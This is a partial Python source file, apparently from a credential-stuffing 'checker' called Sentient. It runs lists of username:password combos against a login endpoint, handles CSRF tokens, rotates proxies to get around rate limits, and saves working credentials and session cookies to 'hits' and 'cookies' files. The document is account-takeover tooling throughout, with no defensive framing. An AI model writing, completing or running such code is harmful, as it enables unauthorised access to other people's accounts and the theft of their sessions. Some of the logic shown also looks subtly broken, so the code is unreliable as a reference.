...
def write_output(file, text, results_dir):
    try:
        with open(os.path.join(results_dir, f"{file}.txt"), "a", encoding="utf-8", errors="ignore") as f:
            f.write(f"{text}\n")
    except Exception:
        pass
    ...
    try:
        ...
        if "Incorrect username or password" in resp.text:
            ...
            if cookie:
                STATS['CHECKED'] += 1
                STATS['HITS'] += 1
                write_output("hits", f"{combo.split(':')[0]}:{combo.split(':')[1]}", results_dir)
                write_output("cookies", f"{cookie}", results_dir)
    except Exception:
        pass
...
def worker(chunk, proxies_list, STATS, results_dir):
    ...
    try:
        for proxy in random.sample(proxies_list, min(len(proxies_list), SAMPLE_SIZE)):
            ...
            if proxy in RATELIMITED_PROXY and time.time() - RATELIMITED_PROXY[proxy] < 15:
                continue
            ...
            for combo in random.sample(chunk, min(len(chunk), SAMPLE_SIZE)):
                try:
                    username, password = re.split(r":(?=\S)", combo, maxsplit=1)
                    resp = login(session, headers, username, password)
                    if resp is not None:
                        ...
                        if "x-csrf-token" in resp.headers:
                            ...
                            if resp is not None:
                                process(resp, combo, STATS, results_dir)
                        if resp.status_code == 429 and "Too many requests" in resp.text:
                            RATELIMITED_PROXY[proxy] = time.time()
                except Exception:
                    pass
    finally:
        session.close()
...
def main():
    config = load_config()
    if not config:
        print("{Fore.RED}[CHECKER]: Configuration not found")
        return
    ...
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        for chunk in combos_chunks:
            executor.submit(worker, chunk, proxies_list, STATS, RESULTS_DIR)

    while STATS['CHECKED'] < total_accounts:
        time.sleep(1)

    print("{Fore.GREEN}[CHECKER]: All your accounts have been checked. Thanks for using Sentient!")
